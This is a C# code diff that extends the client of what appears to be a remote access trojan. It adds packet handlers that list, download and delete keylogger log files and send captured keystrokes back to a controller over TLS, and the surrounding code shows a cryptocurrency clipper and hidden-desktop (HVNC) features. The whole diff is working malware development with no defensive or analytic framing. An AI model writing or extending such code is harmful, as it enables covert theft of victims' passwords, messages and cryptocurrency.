@@ -374,6 +374,40 @@ internal class TlsClient : IDisposable
                     KeyloggerFeature.GetAndClearLogs();
                     break;
 
+                case PacketType.KeyloggerListFiles:
+                    var klFiles = KeyloggerFeature.GetLogFiles();
+                    _ = WritePacketAsync(new Packet
+                    {
+                        Type = PacketType.KeyloggerFilesResult,
+                        Data = JsonSerializer.Serialize(
+                            new KeyloggerFilesResultStub
+                            {
+                                Files = klFiles.ToList(),
+                                IsRunning = KeyloggerFeature.IsRunning
+                            }, SeroJson.Default.KeyloggerFilesResultStub)
+                    }, ct);
+                    break;
+
+                case PacketType.KeyloggerGetFile:
+                    var klGf = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.KeyloggerGetFileStub);
+                    if (klGf != null)
+                    {
+                        var content = KeyloggerFeature.GetFileContent(klGf.Filename);
+                        _ = WritePacketAsync(new Packet
+                        {
+                            Type = PacketType.KeyloggerFileContent,
+                            Data = JsonSerializer.Serialize(
+                                new KeyloggerFileContentStub { Filename = klGf.Filename, Content = content },
+                                SeroJson.Default.KeyloggerFileContentStub)
+                        }, ct);
+                    }
+                    break;
+
+                case PacketType.KeyloggerDeleteFile:
+                    var klDf = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.KeyloggerGetFileStub);
+                    if (klDf != null) KeyloggerFeature.DeleteFile(klDf.Filename);
+                    break;
+
                 // ── Crypto Clipper ────────────────────────────────────
                 case PacketType.ClipperSetConfig:
                     var clipCfg = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.ClipperSetConfigStub);
@@ -1254,11 +1288,16 @@ internal enum PacketType
     FunCmd    = 160,
     FunResult = 161,
 
-    KeyloggerStart      = 170,
-    KeyloggerStop       = 171,
-    KeyloggerGetLogs    = 172,
-    KeyloggerLogsResult = 173,
-    KeyloggerClear      = 174,
+    KeyloggerStart       = 170,
+    KeyloggerStop        = 171,
+    KeyloggerGetLogs     = 172,
+    KeyloggerLogsResult  = 173,
+    KeyloggerClear       = 174,
+    KeyloggerListFiles   = 175,
+    KeyloggerFilesResult = 176,
+    KeyloggerGetFile     = 177,
+    KeyloggerFileContent = 178,
+    KeyloggerDeleteFile  = 179,
 
     ClipperSetConfig    = 180,
     ClipperGetStats     = 181,
@@ -1428,6 +1467,11 @@ internal class HvncClipboardDataStub
 [JsonSerializable(typeof(FunResultStub))]
 // Keylogger
 [JsonSerializable(typeof(KeyloggerLogsResultStub))]
+[JsonSerializable(typeof(KeyloggerFileInfo))]
+[JsonSerializable(typeof(KeyloggerFilesResultStub))]
+[JsonSerializable(typeof(KeyloggerGetFileStub))]
+[JsonSerializable(typeof(KeyloggerFileContentStub))]
+[JsonSerializable(typeof(List<KeyloggerFileInfo>))]
 // Crypto Clipper
 [JsonSerializable(typeof(ClipperSetConfigStub))]
 [JsonSerializable(typeof(ClipperConfig))]
